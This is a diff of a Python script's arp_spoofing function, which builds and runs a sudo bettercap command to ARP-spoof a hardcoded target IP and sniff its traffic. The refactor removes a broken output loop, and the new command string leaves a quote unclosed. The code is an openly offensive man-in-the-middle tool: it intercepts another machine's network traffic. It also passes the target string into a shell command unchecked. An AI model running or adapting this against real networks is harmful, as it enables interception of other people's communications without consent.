@@ -56,28 +56,19 @@ def arp_spoofing(target_ip):
     
     global interface
     
-    arp_interface = f"set arp.spoof.interface {interface}"
-    set_arp_target =f"set arp.spoof.targets {target_ip}"
-    turn_arp_on = f"arp.spoof on"
-    start_sniffing = f"net.sniff on"
-    
-    update_command = f"sudo bettercap -eval '{arp_interface}; {set_arp_target}; {turn_arp_on}; {start_sniffing}"
-    
-    process = subprocess.Popen(update_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    commands = [
+        f"set arp.spoof.interface {interface}",
+        f"set arp.spoof.targets {target_ip}",
+        "arp.spoof on",
+        "net.sniff on"
+    ]
+    update_command = f"sudo bettercap -eval '{'; '.join(commands)}"
     
     try:
         subprocess.run(update_command, shell=True)
-        print(f"ARP Spoofing is set for {target_ip}")
-        
-        while True:
-            sniffed_output = process.stdout.readline()
-            
-            if sniffed_output:
-                print(output.strip())
-            
+        print(f"ARP Spoofing and sniffing started for {target_ip}")
     except Exception as e:
         print(f"Error setting ARP Spoofing: {e}")
-
 #--------------------------
 device_ip = '169.254.62.118'
 interface = 'eth0'
